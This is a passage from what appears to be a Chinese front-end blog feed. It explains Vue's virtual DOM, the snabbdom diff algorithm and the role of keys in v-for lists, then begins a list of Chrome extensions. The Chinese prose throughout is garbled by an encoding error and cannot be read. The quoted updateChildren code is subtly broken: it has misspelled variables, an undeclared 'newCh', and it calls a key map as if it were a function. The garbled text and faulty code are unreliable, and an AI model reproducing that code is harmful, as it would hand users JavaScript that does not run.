å°„DOMä¿¡æ¯çš„èŠ‚ç‚¹æ•°æ®ã€‚è§†å›¾éœ€è¦æ›´æ–°æ—¶ï¼Œå…ˆå¯¹èŠ‚ç‚¹æ•°æ®è¿›è¡Œdiffåå¾—åˆ°å·®å¼‚ç»“æœåï¼Œå†ä¸€æ¬¡æ€§å¯¹DOMè¿›è¡Œæ‰¹é‡æ›´æ–°æ“ä½œã€‚</p><ul><li>è·Ÿè¸ªè§†å›¾çŠ¶æ€ï¼Œæ¯”è¾ƒå‰åä¸¤æ¬¡DOMæ›´æ–°çœŸå®DOMï¼Œå‡å°‘æ“ä½œDOMçš„èŒƒå›´</li><li>è·¨å¹³å°ä½¿ç”¨ï¼šæµè§ˆå™¨æ¸²æŸ“ï¼ŒæœåŠ¡å™¨æ¸²æŸ“ï¼Œå°ç¨‹åºç­‰</li></ul><p><br></p><h3 id="2-Diffç®—æ³•"><a href="#2-Diffç®—æ³•" class="headerlink" title="2. Diffç®—æ³•"></a>2. Diffç®—æ³•</h3><ul><li>ä½¿ç”¨<code>h()</code>å‡½æ•°åˆ›å»ºJSå¯¹è±¡(VNode)æè¿°çœŸå®DOM</li><li>åˆ›å»º<code>patch()</code>æ¯”è¾ƒæ–°æ—§ä¸¤ä¸ªVNode<ul><li><code>patch(oldVNode, newVnode)</code></li><li>æŒ‰å±‚çº§diffï¼Œè€Œéæ·±åº¦ä¼˜å…ˆéå†</li><li>æ¯”è¾ƒæ–°æ—§èŠ‚ç‚¹æ˜¯å¦ç›¸åŒèŠ‚ç‚¹ï¼ˆkey, selç›¸åŒï¼‰ï¼Œå¦‚æœä¸æ˜¯ç›¸åŒèŠ‚ç‚¹ï¼Œåˆ é™¤ä¹‹å‰çš„ï¼Œé‡æ–°æ¸²æŸ“ï¼›å¦‚æœæ˜¯ç›¸åŒèŠ‚ç‚¹ï¼Œåˆ¤æ–­VNodeæ˜¯å¦æœ‰textï¼Œæœ‰ç›´æ¥æ›´æ–°textæ–‡æœ¬å†…å®¹</li><li>æ–°è€èŠ‚ç‚¹æœ‰childrenå±æ€§ä¸”ä¸ç­‰ï¼Œèµ°updateChildren</li></ul></li><li>æŠŠå˜åŒ–çš„å†…å®¹æ›´æ–°åˆ°çœŸå®DOMæ ‘</li></ul><h4 id="2-1-æŒ‰å±‚çº§diffï¼Œè€Œéæ·±åº¦ä¼˜å…ˆéå†"><a href="#2-1-æŒ‰å±‚çº§diffï¼Œè€Œéæ·±åº¦ä¼˜å…ˆéå†" class="headerlink" title="2.1 æŒ‰å±‚çº§diffï¼Œè€Œéæ·±åº¦ä¼˜å…ˆéå†"></a><em>2.1 æŒ‰å±‚çº§diffï¼Œè€Œéæ·±åº¦ä¼˜å…ˆéå†</em></h4><p>UIä¸­å¾ˆå°‘å‡ºç°DOMçš„å±‚çº§ç»“æ„å› ä¸ºäº¤äº’è€Œäº§ç”Ÿæ›´æ–°ã€‚å› æ­¤VirtualDOMçš„diffç­–ç•¥æ˜¯åœ¨æ–°æ—§èŠ‚ç‚¹æ ‘ä¹‹é—´æŒ‰å±‚çº§è¿›è¡Œdiffå¾—åˆ°å·®å¼‚ï¼Œè€Œéä¼ ç»Ÿçš„æŒ‰æ·±åº¦éå†æœç´¢ã€‚<br><img src="/2019/12/16/Vue-key/1.png"></p><p><br></p><h4 id="2-2-ä¸åŒç±»å‹çš„èŠ‚ç‚¹ï¼Œä¼šåˆ›å»ºæ–°çš„VirtualDomæ›¿æ¢æ—§çš„"><a href="#2-2-ä¸åŒç±»å‹çš„èŠ‚ç‚¹ï¼Œä¼šåˆ›å»ºæ–°çš„VirtualDomæ›¿æ¢æ—§çš„" class="headerlink" title="2.2 ä¸åŒç±»å‹çš„èŠ‚ç‚¹ï¼Œä¼šåˆ›å»ºæ–°çš„VirtualDomæ›¿æ¢æ—§çš„"></a><em>2.2 ä¸åŒç±»å‹çš„èŠ‚ç‚¹ï¼Œä¼šåˆ›å»ºæ–°çš„VirtualDomæ›¿æ¢æ—§çš„</em></h4><p>VirtualDOMä¸­çš„èŠ‚ç‚¹æ•°æ®å¯¹åº”çš„æ˜¯ä¸€ä¸ªåŸç”ŸDOMèŠ‚ç‚¹ï¼Œæˆ–è€…vue/reactä¸­çš„ä¸€ä¸ªç»„ä»¶ã€‚ä¸åŒç±»å‹çš„èŠ‚ç‚¹å¾€å¾€ç›¸å·®å¾ˆå¤§ï¼Œå½“èŠ‚ç‚¹ç±»å‹å‘ç”Ÿæ”¹å˜æ—¶ï¼Œåˆ™ä¸è¿›è¡Œå­æ ‘çš„æ¯”è¾ƒï¼Œç›´æ¥åˆ›å»ºæ–°ç±»å‹çš„VirtualDOMï¼Œæ›¿æ¢æ—§èŠ‚ç‚¹ã€‚<br><img src="/2019/12/16/Vue-key/2.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// snabbdom.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sameVnode</span>(<span class="params">vnode1, vnode2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> vnode1.key === vnode2.key &amp;&amp; vnode1.sel === vnode2.sel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">patch</span>(<span class="params">oldVnode, vnode</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// ç›¸åŒç±»å‹çš„Vnodeï¼Œæ¯”è¾ƒåæ›´æ–°</span></span><br><span class="line">    <span class="keyword">if</span> (sameVnode(oldVnode, vnode)) &#123;</span><br><span class="line">        patchVnode(oldVnode, vnode)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ä¸åŒç±»å‹çš„Vnodeï¼Œåˆ›å»ºæ–°çš„èŠ‚ç‚¹ï¼Œæ›¿æ¢æ—§çš„èŠ‚ç‚¹</span></span><br><span class="line">        elm = oldVnode.elm</span><br><span class="line">        parent = api.parentNode(elm)</span><br><span class="line">        createElm(vnode)</span><br><span class="line">        <span class="keyword">if</span> (parent !== <span class="literal">null</span>) &#123;</span><br><span class="line">            api.insertBefore(parent, vnode.elm, api.nextSibling(elm))</span><br><span class="line">            removeVnodes(parent, [oldVnode])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-æ–°æ—§èŠ‚ç‚¹éƒ½æœ‰childrenä¸”ä¸ç­‰ï¼Œèµ°updateChildren"><a href="#2-3-æ–°æ—§èŠ‚ç‚¹éƒ½æœ‰childrenä¸”ä¸ç­‰ï¼Œèµ°updateChildren" class="headerlink" title="2.3 æ–°æ—§èŠ‚ç‚¹éƒ½æœ‰childrenä¸”ä¸ç­‰ï¼Œèµ°updateChildren"></a><em>2.3 æ–°æ—§èŠ‚ç‚¹éƒ½æœ‰childrenä¸”ä¸ç­‰ï¼Œèµ°updateChildren</em></h4><ul><li>oldStartVnode/newStartVnode(æ—§å¼€å§‹èŠ‚ç‚¹/æ–°å¼€å§‹èŠ‚ç‚¹)ç›¸åŒ</li><li>oldEndVnode/newEndVnode(æ—§ç»“æŸèŠ‚ç‚¹/æ–°ç»“æŸèŠ‚ç‚¹)ç›¸åŒ</li><li>oldStartVnode/newEndVnode(æ—§å¼€å§‹èŠ‚ç‚¹/æ–°ç»“æŸèŠ‚ç‚¹)ç›¸åŒ</li><li>oldEndVnode/newStartVnode(æ—§ç»“æŸèŠ‚ç‚¹/æ–°å¼€å§‹èŠ‚ç‚¹)ç›¸åŒ</li><li>ç‰¹æ®Šæƒ…å†µå½“1,2,3,4çš„æƒ…å†µéƒ½ä¸ç¬¦åˆçš„æ—¶å€™å°±ä¼šæ‰§è¡Œ,åœ¨oldVnodesé‡Œé¢å¯»æ‰¾è·ŸnewStartVnodeä¸€æ ·çš„èŠ‚ç‚¹ç„¶åä½ç§»åˆ°oldStartVnode,è‹¥æ²¡æœ‰æ‰¾åˆ°åœ¨å°±oldStartVnodeåˆ›å»ºä¸€ä¸ª</li></ul><h4 id="ä¼˜åŒ–åˆ—è¡¨æ›´æ–°æ€§èƒ½"><a href="#ä¼˜åŒ–åˆ—è¡¨æ›´æ–°æ€§èƒ½" class="headerlink" title="ä¼˜åŒ–åˆ—è¡¨æ›´æ–°æ€§èƒ½"></a>ä¼˜åŒ–åˆ—è¡¨æ›´æ–°æ€§èƒ½</h4><p>å½“è¢«diffçš„èŠ‚ç‚¹å¤„äºåŒä¸€å±‚çº§æ—¶ï¼Œå¯ä»¥æ‰§è¡Œ æ’å…¥ã€ç§»åŠ¨å’Œåˆ é™¤ä¸‰ç§æ“ä½œã€‚åŒæ—¶æä¾›ç”¨æˆ·è®¾ç½®keyå±æ€§çš„æ–¹å¼è°ƒæ•´æ’åºã€‚<br><img src="/2019/12/16/Vue-key/3.png"></p><p>ä¸‹é¢çœ‹çœ‹snabbdomæ€ä¹ˆå¤„ç†è¿™ä¸ª<em><code>key</code></em>å€¼ã€‚<br>(snabbdomä»…æœ‰300è¡Œä»£ç ï¼Œè¢«vue2.0æ”¶å…¥æ¥å®ç°DOMæ¯”è¾ƒå’Œæ›´æ–°)</p><h4 id="åˆ—è¡¨å¤´æ’å…¥å…ƒç´ "><a href="#åˆ—è¡¨å¤´æ’å…¥å…ƒç´ " class="headerlink" title="åˆ—è¡¨å¤´æ’å…¥å…ƒç´ "></a>åˆ—è¡¨å¤´æ’å…¥å…ƒç´ </h4><p>å‘ç°oldChé‡Œæ²¡æœ‰å½“å‰newChä¸­çš„èŠ‚ç‚¹ï¼Œå°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°oldStartVnodeçš„å‰è¾¹ã€‚<br><img src="/2019/12/16/Vue-key/4.png" style="max-width: 500px; margin-top: 20px"></p><p><br></p><h4 id="åˆ—è¡¨é‡æ–°æ’åº"><a href="#åˆ—è¡¨é‡æ–°æ’åº" class="headerlink" title="åˆ—è¡¨é‡æ–°æ’åº"></a>åˆ—è¡¨é‡æ–°æ’åº</h4><p>å¦‚æœoldChä¸­æœ‰è¿™ä¸ªkeyå€¼ï¼Œå°±å¯¹æ—§èŠ‚ç‚¹è¿›è¡Œæ›´æ–°ï¼Œå†å°†å…¶æ’å…¥åˆ°å½“å‰çš„oldStartVnodeçš„å‰é¢ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createKeyToOldIdx</span>(<span class="params">children, beginIdx, endIdx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i, map = &#123;&#125;, key, ch</span><br><span class="line">    <span class="keyword">for</span>( i = beginIdex; i &lt; endIdx; ++i) &#123;</span><br><span class="line">        ch = children[i]</span><br><span class="line">        <span class="keyword">if</span> (ch != <span class="literal">null</span>) &#123;</span><br><span class="line">            key = ch.key</span><br><span class="line">            <span class="keyword">if</span> (key !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">                map[key] = i</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateChild</span>(<span class="params">parentElm, oldVnode, vnode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oldCh = oldVnode.children</span><br><span class="line">    <span class="keyword">var</span> ch = vnode.children</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> oldStartIdx = <span class="number">0</span>, newStartIdx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> oldEndIdx = oldCh.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> oldStartVnode = oldCh[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> oldEndVnode = oldCh[oldEndIdx];</span><br><span class="line">    <span class="keyword">var</span> newEndIdx = newCh.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> newStartVnode = newCh[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> newEndVnode = newCh[newEndIdx];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> oldKeyToIdx; <span class="comment">// &#123; key1: index1, key2: index2 &#125; keyå€¼: åœ¨æ—§åˆ—è¡¨ä¸­çš„ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">var</span> idxInOld;</span><br><span class="line">    <span class="keyword">var</span> elmToMove;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (oldStartIdx &lt;= oldEndInx &amp;&amp; newStartIdx &lt;= newEndIdx) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sameVnode(...)) &#123;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (oldKeyToIdx === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            idxInOld = oldKeyToIdx(newStartVnode.key)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isUndef(idxInOld)) &#123;</span><br><span class="line">                <span class="comment">// æ—§åˆ—è¡¨æ²¡æœ‰è¿™ä¸ªkey</span></span><br><span class="line">                <span class="comment">// insertBefore(parentNode, newNode, referenceNode)</span></span><br><span class="line">                api.insertBefore(parentElm, createElm(newStartVnode), oldStartVnode.elm)</span><br><span class="line">                newStartVnode = newCh[++newStartIdx]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// æ—§åˆ—è¡¨æœ‰è¿™ä¸ªkey</span></span><br><span class="line">                elmToMove = oldCh[idxInOld] <span class="comment">// æ‰¾åˆ°è¦ç§»åŠ¨çš„elem</span></span><br><span class="line">                oldCh[idxInOld] = <span class="literal">undefined</span></span><br><span class="line">                api.insertBefore(parentElm, elmToMove.elm, oldStartVnode.elm)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-Key"><a href="#3-Key" class="headerlink" title="3. Key"></a>3. Key</h3><p><em>v-forä¸ºä»€ä¹ˆè¦åŠ Key?</em></p><ul><li>Diffæ“ä½œæ›´åŠ å¿«é€Ÿ</li><li>Diffæ“ä½œæ›´åŠ å‡†ç¡®ï¼ˆé¿å…æ¸²æŸ“é”™è¯¯ï¼‰</li></ul><h4 id="3-1-Diffæ“ä½œæ›´åŠ å¿«é€Ÿ"><a href="#3-1-Diffæ“ä½œæ›´åŠ å¿«é€Ÿ" class="headerlink" title="3.1 Diffæ“ä½œæ›´åŠ å¿«é€Ÿ"></a>3.1 Diffæ“ä½œæ›´åŠ å¿«é€Ÿ</h4><p>å½“é€’å½’DOMèŠ‚ç‚¹çš„å­å…ƒç´ æ—¶ï¼ŒVueä¼šåŒæ—¶éå†ä¸¤ä¸ªå­å…ƒç´ çš„åˆ—è¡¨ï¼Œå½“äº§ç”Ÿå·®å¼‚æ—¶ï¼Œç”Ÿæˆä¸€ä¸ªDOMæ“ä½œã€‚<br>åœ¨åˆ—è¡¨æœ«å°¾æ–°å¢å…ƒç´ æ—¶ï¼Œå˜æ›´å¼€é”€æ¯”è¾ƒå°ã€‚Vueéå†åˆ—è¡¨ï¼Œå‘ç°å‰ä¸¤ä¸ªå…ƒç´ æ²¡å˜ï¼Œç„¶åæ’å…¥ç¬¬ä¸‰ä¸ªå…ƒç´ ã€‚<br>åœ¨åˆ—è¡¨å¤´éƒ¨æ’å…¥æ—¶ï¼ŒVueä¾æ¬¡éå†ä¸‹æ¥ï¼Œä¼šé’ˆå¯¹æ¯ä¸ªå­å…ƒç´ éƒ½ç”Ÿæˆäº†DOMæ“ä½œã€‚</p><p><strong>æ˜æ˜ç§»åŠ¨èŠ‚ç‚¹å°±å¯ä»¥è§£å†³é—®é¢˜ï¼Œå´å˜æˆäº†DOMèŠ‚ç‚¹ä¸æ–­åœ°åˆ é™¤å’Œé‡å»ºï¼</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>zero<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>è¿™ç§æƒ…å†µå¤šæ•°å‡ºç°åœ¨<code>v-for</code>ã€‚<br>å‡ºç°<code>v-for</code>æ—¶ï¼Œ Vueä¼šè®¤ä¸ºåˆæœ‰æ›´æ–°åˆ—è¡¨çš„æ“ä½œäº†ï¼<br><strong>è¿™ä¸ªåˆ—è¡¨DOMæ›´æ–°çš„æ€§èƒ½é—®é¢˜åˆè¦å‡ºç°äº†ï¼</strong><br>è¿™æ—¶ï¼Œæ§åˆ¶å°ä¼šæé†’æˆ‘ä»¬: åŠ ä¸ª<em><code>key</code></em>å•Šï¼ï¼ï¼ï¼ï¼</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"0"</span>&gt;</span>zero<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>key</code>è¿™ä¸ªå±æ€§ä¸æ˜¯ç»™ç”¨æˆ·ç”¨çš„ï¼Œè€Œæ˜¯ç»™Vueè‡ªå·±ç”¨çš„ã€‚Vueéœ€è¦åˆ¤æ–­ï¼Œå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹ï¼Œåˆ°åº•æ˜¯æ–°å»ºä¸€ä¸ªå…ƒç´ åŠ å…¥åˆ°é¡µé¢ä¸­ï¼Œè¿˜æ˜¯æ›´æ–°åŸæ¥çš„å…ƒç´ ã€‚ä»è€Œé¿å…ç»„ä»¶è¢«ä¸å¿…è¦åœ°é‡å»ºã€‚</p><h4 id="3-2-é¿å…æ¸²æŸ“é”™è¯¯"><a href="#3-2-é¿å…æ¸²æŸ“é”™è¯¯" class="headerlink" title="3.2 é¿å…æ¸²æŸ“é”™è¯¯"></a>3.2 é¿å…æ¸²æŸ“é”™è¯¯</h4><p>å› ä¸ºæ²¡æœ‰è®¾ç½®key,é»˜è®¤éƒ½æ˜¯undefined,æ‰€ä»¥èŠ‚ç‚¹éƒ½æ˜¯ç›¸åŒçš„,æ›´æ–°äº†textçš„å†…å®¹ä½†è¿˜æ˜¯æ²¿ç”¨äº†ä¹‹å‰çš„dom,æ‰€ä»¥å®é™…ä¸Ša-&gt;z(aåŸæœ¬æ‰“å‹¾çš„çŠ¶æ€ä¿ç•™äº†,åªæ”¹å˜äº†text)</p><p><br></p><p><br></p><h3 id="4-æ³¨æ„"><a href="#4-æ³¨æ„" class="headerlink" title="4. æ³¨æ„"></a>4. æ³¨æ„</h3><ul><li>å¼€å‘è€…å¯ä»¥é€šè¿‡key propæ¥æš—ç¤ºå“ªäº›å­å…ƒç´ åœ¨ä¸åŒçš„æ¸²æŸ“ä¸‹èƒ½ä¿æŒç¨³å®šã€‚Keyåº”è¯¥å…·æœ‰ç¨³å®šï¼Œå¯é¢„æµ‹ï¼Œä»¥åŠåˆ—è¡¨å†…å”¯ä¸€çš„ç‰¹è´¨ã€‚ä¸ç¨³å®šçš„key(é€šè¿‡<code>Math.random()</code>ç”Ÿæˆçš„)ä¼šå¯¼è‡´è®¸å¤šç»„ä»¶å®ä¾‹å’ŒDOMèŠ‚ç‚¹è¢«ä¸å¿…è¦åœ°é‡æ–°åˆ›å»ºï¼Œå¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™å’Œå­ç»„ä»¶ä¸­çš„çŠ¶æ€ä¸¢å¤±ã€‚</li><li>ã€çœŸå®æƒ…æ™¯ã€‘ä¸Šä¼ å¤šå¼ å‘ç¥¨ï¼Œä¸Šä¼ åè‡ªåŠ¨è¯†åˆ«å‘ç¥¨æ•°æ®ï¼Œç”¨æˆ·å¯ä»¥ä¿®æ”¹æ•°æ®ã€‚ç‚¹å‡»å›¾ç‰‡ï¼Œåˆ‡æ¢å‘ç¥¨æ•°æ®çš„ä¿®æ”¹ã€‚è¿™æ—¶éœ€è¦ç»™<code>&lt;form&gt;</code>æ·»åŠ <code>key</code>å€¼ï¼Œå¦åˆ™åœ¨åˆ‡æ¢æ—¶ï¼ŒVueä¼šè®¤ä¸ºè¿™æ˜¯åŒä¸€ä¸ªç»„ä»¶ã€‚ä¼šæŠŠä¸€äº›æ ¡éªŒæç¤ºå¸¦åˆ°ä¸‹ä¸€ä¸ªå‘ç¥¨è¡¨å•ã€‚</li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5b0638a9f265da0db53bbb6d" target="_blank" rel="noopener">æ¢ç´¢Virtual DOMçš„å‰ä¸–ä»Šç”Ÿ</a></li><li><a href="https://zh-hans.reactjs.org/docs/reconciliation.html" target="_blank" rel="noopener">React Diffç®—æ³•</a></li><li><a href="https://github.com/snabbdom/snabbdom" target="_blank" rel="noopener">snabbdom</a></li><li><a href="https://juejin.im/post/5c8e5e4951882545c109ae9c" target="_blank" rel="noopener">è®©è™šæ‹ŸDOMå’ŒDOM-diffä¸å†æˆä¸ºä½ çš„ç»Šè„šçŸ³</a></li><li><a href="https://fed.taobao.org/blog/taofed/do71ct/react-key/?spm=taofed.blogs.blog-list.9.29eb5ac8BdaVc1" target="_blank" rel="noopener">React å®è·µå¿ƒå¾—ï¼škey å±æ€§çš„åŸç†å’Œç”¨æ³•</a></li><li><a href="https://www.zhihu.com/people/111111-80-11-31" target="_blank" rel="noopener">ç½‘ä¸Šéƒ½è¯´æ“ä½œçœŸå® DOM æ…¢ï¼Œä½†æµ‹è¯•ç»“æœå´æ¯” React æ›´å¿«ï¼Œä¸ºä»€ä¹ˆï¼Ÿ</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Chromeæ’ä»¶</title>
      <link href="/2019/12/13/Chrome%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
      <url>/2019/12/13/Chrome%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
      <content type="html"><![CDATA[<h4 id="1-Octotree"><a href="#1-Octotree" class="headerlink" title="1. Octotree"></a><em>1. Octotree</em></h4><p>å°†githubé¡¹ç›®ä»£ç ä»¥æ ‘å½¢æ ¼å¼å±•ç¤º</p><h4 id="2-Vue-js-devtools"><a href="#2-Vue-js-devtools" class="headerlink" title="2. Vue.js devtools"></a><em>2. Vue.js devtools</em></h4><p>Vueè°ƒè¯•æ’ä»¶</p><h4 id="3-äºŒç»´ç ç”Ÿæˆå™¨-Quick-QR"><a href="#3-äºŒç»´ç ç”Ÿæˆå™¨-Quick-QR" class="headerlink" title="3. äºŒç»´ç ç”Ÿæˆå™¨(Quick QR)"></a><em>3. äºŒç»´ç ç”Ÿæˆå™¨(Quick QR)</em></h4><p>å°†å½“å‰é¡µé¢åœ°å€è½¬åŒ–æˆäºŒç»´ç ï¼Œä¹Ÿå¯ä»¥ä»»æ„è¾“å…¥å†…å®¹è½¬åŒ–æˆäºŒç»´ç </p><h4 id="4-SwitchyOmega"><a href="#4-SwitchyOmega" class="headerlink" title="4. SwitchyOmega"></a><em>4. SwitchyOmega</em></h4><p>åˆ‡æ¢æµ‹è¯•ç¯å¢ƒçš„æ–¹æ³•æœ‰ä¸¤ç§</p><ul><li>æ ¹æ®åŸŸåç›´æ¥è®¿é—®å¯¹åº”çš„æµ‹è¯•ç¯å¢ƒï¼Œå¦‚æœé‡åˆ°è·¨åŸŸé—®é¢˜ï¼Œå°±ä½¿ç”¨devServer, nginxåå‘ä»£ç†</li><li>ä¿®æ”¹æœ¬åœ°hostæ–‡ä»¶ï¼Œè®©è¯·æ±‚åœ°å€æŒ‡å‘æµ‹è¯•ç¯å¢ƒåœ°å€<blockquote><p>Hostsæ˜¯ä¸€ä¸ªæ²¡æœ‰æ‰©å±•åçš„ç³»ç»Ÿæ–‡ä»¶ï¼Œå…¶åŸºæœ¬ä½œç”¨å°±æ˜¯å°†ä¸€äº›å¸¸ç”¨çš„ç½‘å€åŸŸåä¸å…¶å¯¹åº”çš„IPåœ°å€å»ºç«‹ä¸€ä¸ªå…³è”â€œæ•°æ®åº“â€ã€‚å½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘å€æ—¶ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä»Hostsæ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„IPåœ°å€ï¼Œä¸€æ—¦æ‰¾åˆ°ï¼Œç³»ç»Ÿä¼šç«‹å³æ‰“å¼€å¯¹åº”ç½‘é¡µï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ä¼šå°†ç½‘å€æäº¤DNSåŸŸåè§£ææœåŠ¡å™¨è¿›è¡ŒIPåœ°å€çš„è§£æã€‚</p></blockquote></li></ul><p>å½“sit, 